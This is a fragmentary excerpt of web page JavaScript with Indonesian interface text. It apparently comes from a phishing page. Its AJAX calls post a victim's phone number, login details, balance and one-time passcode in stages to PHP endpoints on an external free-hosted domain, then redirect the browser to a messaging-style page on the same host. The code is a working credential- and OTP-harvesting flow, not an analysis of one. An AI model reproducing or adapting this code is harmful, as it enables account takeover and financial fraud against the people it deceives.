...
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses...";
      ...
      $.ajax({
            type: 'POST',
            url: 'https://chroedevsi.whf.bz/d5h5/no.php',
...
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
      $.ajax({
            type: 'POST',
            url: 'https://chroedevsi.whf.bz/d5h5/login.php',
...
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
      $.ajax({
            type: 'POST',
            url: 'https://chroedevsi.whf.bz/d5h5/saldo.php',
...
$.ajax({
 type: 'POST',
 url: 'https://chroedevsi.whf.bz/d5h5/otp.php',
 async: false,
 dataType: 'JSON',
...
function getcs(){
 $("#djload").show();   
  ...
  audio1 = document.getElementById("bsi");
    ...
    audio4.loop = false
setTimeout(function(){  
location.href='https://chroedevsi.whf.bz/wa/d5h5';
    }, 1000);
    setTimeout(function(){
    $("#djload").hide();   
    }, 1000);      
